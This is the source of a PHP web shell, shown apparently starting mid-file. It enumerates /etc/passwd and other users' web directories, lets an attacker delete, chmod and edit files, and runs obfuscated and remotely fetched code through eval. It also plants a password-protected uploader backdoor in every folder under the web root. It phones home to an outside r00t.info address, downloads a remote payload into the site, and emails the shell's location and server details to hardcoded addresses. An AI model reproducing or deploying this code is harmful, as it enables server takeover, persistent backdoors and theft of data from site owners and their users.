				<?php  ($sm = 0 == ini_get('safe_mode')) ? $sm = 'off' : die('<b>Error: safe_mode = on</b>'); set_time_limit(0); @$passwd = fopen('/etc/passwd', 'r'); if (!$passwd) {
        die('<br>[-] Error : coudn`t read /etc/passwd');
    } $pub = []; $users = []; $conf = []; $i = 0; while (!feof($passwd)) {
        $str = fgets($passwd);
        if ($i > 35) {
            $pos = strpos($str, ':');
            $username = substr($str, 0, $pos);
            $dirz = '/home/' . $username . '/public_html/';
            if (('' != $username)) {
                if (is_readable($dirz)) {
                    array_push($users, $username);
                    array_push($pub, $dirz);
                }
            }
        }
        ++$i;
    } echo '<br><br></center></center>'; echo "<font class='rapihbanget'>[+] Founded " . sizeof($users) . " entrys in /etc/passwd\n" . '<br /></font>'; echo "<font class='rapihbanget'>[+] Founded " . sizeof($pub) . " readable public_html directories\n" . '<br /></font>'; echo "<font class='rapihbanget'>[~] Searching for passwords in config files...<br /><br /></font>"; foreach ($users as $user) {
        $path = "/home/$user/public_html/";
        echo "<font class='rapihbanget'><a href='?path&#61;$path' target='_blank' font-weight:bold; color:#F80;'>$path</a><br></font>";
    } echo "<br /><font class='rapihbanget'>[+] Complete...\n" . '<br /></font>'; echo "<font class='rapihbanget'>[+] Monggo Sikat Boz!\n" . '<br /></font>'; echo '<br><br></b></body><center>'; } elseif (isset($_GET['x']) && ('zonesH' == $_GET['x'])) {
        echo '<br/><br/>';
        @eval(gzinflate(base64_decode($zoneH)));
        '</div>';
    } else {
        echo '</table><br />';
        echo '<center>';
        if (isset($_GET['option']) && 'delete' == $_POST['opt']) {
            if ('dir' == $_POST['type']) {
                if (rmdir($_POST['path'])) {
                    echo '<script>alert("Delete Dir Sukses!");</script>';
                } else {
                    echo '<script>alert("Delete Dir Gagal!");</script>';
                }
            } elseif ('file' == $_POST['type']) {
                if (unlink($_POST['path'])) {
                    echo '<script>alert("Delete File Sukses!");</script>';
                } else {
                    echo '<script>alert("Delete File Gagal!");</script>';
                }
            }
        }
        echo '</center>';
        $scandir = scandir($path);
        echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
			';
        foreach ($scandir as $dir) {
            if (!is_dir("$path/$dir") || '.' == $dir || '..' == $dir) {
                continue;
            }
            echo "<tr>
			<td><a style='color:white; font-family:Homenaje;' href=\"?path=$path/$dir\">$dir</a></td>
			<td><center style='color:orange; font-family:Homenaje;'>--</center></td>
			<td><center>";
            if (is_writable("$path/$dir")) {
                echo "<font style='color:springgreen; font-family:Homenaje;'>";
            } elseif (!is_readable("$path/$dir")) {
                echo "<font style='color:red; font-family:Homenaje;'>";
            }
            echo perms("$path/$dir");
            if (is_writable("$path/$dir") || !is_readable("$path/$dir")) {
                echo '</font>';
            }
            echo "</center></td>
			<td width='26%'><center><form method=\"POST\" action=\"?option&path=$path\">
			<select class='bordergaya' name=\"opt\">
			<option value=\"\"></option>
			<option value=\"delete\">Delete</option>
			<option value=\"chmod\">Chmod</option>
			<option value=\"rename\">Rename</option>
			</select>
			<input type=\"hidden\" name=\"type\" value=\"dir\">
			<input type=\"hidden\" name=\"name\" value=\"$dir\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
			<input class='bordergaya' type=\"submit\" value=\"Execute\" />
			</form></center></td>
			</tr>";
        }
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
        foreach ($scandir as $file) {
            if (!is_file("$path/$file")) {
                continue;
            }
            $size = filesize("$path/$file") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }
            echo "<tr>
			<td><a style='color:white; font-family:Homenaje;' href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
			<td><center  style='color:orange; font-family:Homenaje;'>" . $size . '</center></td>
			<td><center>';
            if (is_writable("$path/$file")) {
                echo "<font style='color:springgreen; font-family:Homenaje;'>";
            } elseif (!is_readable("$path/$file")) {
                echo "<font style='color:red; font-family:Homenaje;'>";
            }
            echo perms("$path/$file");
            if (is_writable("$path/$file") || !is_readable("$path/$file")) {
                echo '</font>';
            }
            echo "</center></td>
			<td width='26%'><center><form method=\"POST\" action=\"?option&path=$path\">
			<select class='bordergaya' name=\"opt\">
			<option value=\"\"></option>
			<option value=\"delete\">Delete</option>
			<option value=\"chmod\">Chmod</option>
			<option value=\"rename\">Rename</option>
			<option value=\"edit\">Edit</option>
			</select>
			<input type=\"hidden\" name=\"type\" value=\"file\">
			<input type=\"hidden\" name=\"name\" value=\"$file\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
			<input class='bordergaya' type=\"submit\" value=\"Execute\" />
			</form></center></td>
			</tr>";
        }
        echo '</table>
			</div>';
    } ?>
<?php @session_start(); @error_reporting(0); @ini_set('error_log', null); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); @ini_set('display_errors', 0); @ini_set('output_buffering', 0); @set_time_limit(0); @set_magic_quotes_runtime(0); ?>
<?php @session_start(); @error_reporting(0); $a = '<?php
session_start();
if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b><br><br>\'; }	else { echo \'<b>Upload Fail !!!</b><br><br>\'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="a4cd2905b660e8b1bc73a7c4571252da"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
'; if (@$_REQUEST['px']) {
        $p = @$_REQUEST['px'];
        $pa = md5(sha1($p));
        if ('a4cd2905b660e8b1bc73a7c4571252da' == $pa) {
            echo @eval(@file_get_contents(@$_REQUEST['404']));
        }
    } if (@!$_SESSION['sdm']) {
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $dir = scandir($doc);
        $d1 = '' . $doc . '/.';
        $d2 = '' . $doc . '/..';
        if (false !== ($key = @array_search('.', $dir))) {
            unset($dir[$key]);
        }
        if (false !== ($key = @array_search('..', $dir))) {
            unset($dir[$key]);
        }
        if (false !== ($key = @array_search($d1, $dir))) {
            unset($dir[$key]);
        }
        if (false !== ($key = array_search($d2, $dir))) {
            unset($dir[$key]);
        }
        @array_push($dir, $doc);
        foreach ($dir as $d) {
            $p = $doc . '/' . $d;
            if (is_dir($p)) {
                $file = $p . '/newsr.php';
                @touch($file);
                $folder = @fopen($file, 'w');
                @fwrite($folder, $a);
            }
        }
        $lls = $_SERVER['HTTP_HOST'];
        $llc = $_SERVER['REQUEST_URI'];
        $lld = 'http://' . $lls . '' . $llc . '';
        $brow = urlencode($_SERVER['HTTP_USER_AGENT']);
        $retValue = file_get_contents(base64_decode('aHR0cDovL3IwMHQuaW5mby95YXoucGhwP2E=') . '=' . $lld . base64_decode('JmI=') . '=' . $brow);
        echo $retValue;
        @$_SESSION['sdm'] = 1;
    } ?>


<?php  if ($_POST['query']) {
        $veriyfy = stripslashes(stripslashes($_POST['query']));
        $data = 'data.txt';
        @touch('data.txt');
        $ver = @fopen($data, 'w');
        @fwrite($ver, $veriyfy);
        @fclose($ver);
    } else {
        $datas = @fopen('data.txt', 'r');
        $i = 0;
        while ($i <= 5) {
            ++$i;
            $blue = @fgets($datas, 1024);
            echo $blue;
        }
    } $datasi = @fopen('../modules/indexx.php', 'r'); if ($datasi) {
    } else {
        @mkdir('modules');
        $dos = file_get_contents('http://r00t.info/txt/lamer.txt');
        $data = '../modules/indexx.php';
        @touch('../modules/indexx.php');
        $ver = @fopen($data, 'w');
        @fwrite($ver, $dos);
        @fclose($ver);
        $yol = 'http://' . $_SERVER['HTTP_HOST'] . '' . $_SERVER['REQUEST_URI'] . '';
        $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : ' . $yol . '<br/>Sender Yolu : modules/dbs.php</h1>';
        $header .= "From: SheLL Boot <suppor@nic.org>\n";
        $header .= "Content-Type: text/html; charset=utf-8\n";
        @mail('byhero44@gmail.com', 'Hacklink Bildiri', "$y", $header);
        @mail('priphp@hotmail.com', 'Hacklink Bildiri', "$y", $header);
    } ?>

<?php $kime = 'byhero44@gmail.com'; $baslik = 'r00t.info Server Avcisi V1.0'; $EL_MuHaMMeD = 'Dosya Yolu : ' . $_SERVER['DOCUMENT_ROOT'] . "\r\n"; $EL_MuHaMMeD .= 'Server Admin : ' . $_SERVER['SERVER_ADMIN'] . "\r\n"; $EL_MuHaMMeD .= 'Server isletim sistemi : ' . $_SERVER['SERVER_SOFTWARE'] . "\r\n"; $EL_MuHaMMeD .= 'Shell Link : http://' . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\r\n"; $EL_MuHaMMeD .= 'Avlanan Site : ' . $_SERVER['HTTP_HOST'] . "\r\n"; mail($kime, $baslik, $EL_MuHaMMeD); ?>
<br/><br/>
<script language="JavaScript"> Year=new Date(); var copyright=Year.getUTCFullYear(); document.write("<font face='Fredericka the Great' size='3px' color='grey'>&copy; www.r00t.info  " + copyright +"</font> "); </script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
<div id="mefmed">
<script type="text/javascript" src="http://meftunmede.github.io/javascripts/Meftun_Sosyal_bar.js"></script>
</div>
<link href='http://meftunmede.github.io/stylesheets/Meftun_Sosyal_bar.css' rel='stylesheet' type='text/css'/>
<!-- Animasyonlu Sosyal Medya Bar By www.meftunmede.com -->
<script type="text/javascript">
$(document).ready(function(){
$.mefSocialBar({
items: {
facebook: { url: 'https://www.facebook.com/r00t.info/', text: 'Facebook Profili' },
twitter: { url: 'https://www.facebook.com/r00t.info/', text: 'Twitter Profili' },
google: { url: 'https://www.facebook.com/r00t.info/', text: 'Google+ Profili' },
youtube: { url: 'https://www.facebook.com/r00t.info/', text: 'Youtube Profili' },
},
show: 8,
position: "right",
skin: "clear"
});
});
</script>
</BODY></html>